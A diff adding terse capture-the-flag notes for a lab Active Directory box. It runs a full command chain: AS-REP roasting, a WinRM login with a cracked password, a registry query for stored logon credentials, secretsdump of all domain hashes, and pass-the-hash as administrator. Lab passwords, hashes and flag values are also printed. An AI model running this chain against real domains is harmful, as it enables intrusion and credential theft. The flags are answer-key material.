@@ -1,0 +1,31 @@
+
+#impacket tool GetNPUsers to get TGT for all user combinations from site
+username: fsmith
+#################################################################
+GetNPUsers.py egotistical-bank.local/fsmith -dc-ip 10.10.10.175
+#used hashcat or john to crack hash 
+pass:     Thestrokes23
+#then we use evil-winrm tool to connect to fsmith account and get user.txt
+evil-winrm -i 10.10.10.175 -u "fsmith" -p "Thestrokes23" -P 5985
+
+#user.txt hash--> 1b5520b98d97cf17f24122a55baf70cf
+
+
+#net users
+
+Administrator                                         2020-01-24 12:14:15.321116  2020-03-12 22:22:11.361963 
+Guest                                                 <never>              <never>             
+krbtgt                                                2020-01-23 00:45:30.587720  <never>             
+HSmith                                                2020-01-23 00:54:34.140321  <never>             
+FSmith                                                2020-01-23 11:45:19.047096  2020-03-12 22:07:01.077963 
+svc_loanmgr 
+
+
+#svc_loanmngr pass
+reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon"
+#dump all hashes for AD users
+secretsdump.py egotistical-bank.local/svc_loanmgr:"Moneymakestheworldgoround!"@10.10.10.175
+#connect to admin account only with hash with impacket tool wmiexec
+wmiexec.py egotistical-bank.local/administrator@10.10.10.175 -hashes "aad3b435b51404eeaad3b435b51404ee:d9485863c1e9e05851aa40cbb4ab9dff"
+
+#root.txt hash ---> f3ee04965c68257382e31502cc5e881f
